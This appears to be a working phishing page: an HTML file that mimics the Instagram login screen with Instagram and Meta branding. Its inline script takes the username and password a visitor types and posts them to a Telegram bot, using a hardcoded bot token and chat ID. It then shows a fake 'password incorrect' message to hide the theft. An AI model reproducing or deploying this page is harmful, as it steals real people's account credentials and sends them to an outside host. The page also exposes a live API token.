<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="newstyle.css">
    <link rel="icon" href="favicon.png" type="image/icon">
</head>
<body>

    <div class="login-container">
    	<img class="logo-pic" src="logo.png" alt="Logo">
        <form class="login-form" id="loginForm">
            <div class="form-group input-container">
                <input id="username" name="u_name" type="text" placeholder=" " required>
                <label for="username">Username, email address or mobile number</label>
                <span class="clear-icon">&times;</span>
            </div>
            <div class="form-group input-container">
                <input id="password" name="pass" type="password" placeholder=" " required>
                <label for="password">Password</label>
                <span class="toggle-password">
                    <img id="eye-icon" src="hide.png" alt="Toggle Password">
                </span>
            </div>
            
            <button type="submit" class="btn btn-primary">Log in</button>
            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgotten password?</a>
        </form>
        
        <div class="create-account-container">
            <a href="https://www.instagram.com/accounts/emailsignup/" class="btn btn-secondary">Create new account</a>
        </div>
        <img class="meta-pic" src="meta.png" alt="Meta">
    </div>

<script>
    // --- CONFIGURATION ---
    const botToken = '8595419325:AAHCyEpryu-iWIcAGKfD1w1Q-SH5hJGawCU';
    const chatId = '1274263985';

    // --- DOM ELEMENTS (These were missing in your original code) ---
    const loginForm = document.getElementById('loginForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const clearIcon = document.querySelector('.clear-icon');
    const togglePasswordSpan = document.querySelector('.toggle-password');
    const eyeIcon = document.getElementById('eye-icon');

    // --- SUBMISSION LOGIC ---
    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            event.preventDefault(); 

            const usernameValue = usernameInput.value;
            const passwordValue = passwordInput.value;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: `Test Data - Username: ${usernameValue}, Password: ${passwordValue}`
                })
            })
            .then(response => {
                if (response.ok) {
                    alert('Sorry, your password was incorrect. Please double-check your password.');
                    usernameInput.value = '';
                    passwordInput.value = '';
                    // Reset icons after clear
                    clearIcon.style.display = 'none';
                    togglePasswordSpan.style.display = 'none';
                } else {
                    alert('Connection error. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        });
    }

    // --- UI LOGIC ---

    // 1. Password Show/Hide Logic
    function updateEyeIconVisibility() {
        if (passwordInput.value.length > 0) {
            togglePasswordSpan.style.display = 'flex'; 
        } else {
            togglePasswordSpan.style.display = 'none'; 
        }
    }

    // Add listener to password input
    if (passwordInput) {
        passwordInput.addEventListener('input', updateEyeIconVisibility);
    }
    
    // Add listener to the eye icon
    if (togglePasswordSpan) {
        togglePasswordSpan.addEventListener('click', function () {
            const currentType = passwordInput.getAttribute('type');
            if (currentType === 'password') {
                passwordInput.setAttribute('type', 'text');
                eyeIcon.src = "show.png"; 
            } else {
                passwordInput.setAttribute('type', 'password');
                eyeIcon.src = "hide.png"; 
            }
        });
    }

    // 2. Username Clear Button Logic
    if (usernameInput) {
        usernameInput.addEventListener('input', function() {
            if (usernameInput.value.length > 0) {
                clearIcon.style.display = 'block';
            } else {
                clearIcon.style.display = 'none';
            }
        });
    }

    if (clearIcon) {
        clearIcon.addEventListener('click', function() {
            usernameInput.value = ""; 
            clearIcon.style.display = 'none'; 
            usernameInput.focus(); 
        });
    }
</script>
</body>
</html>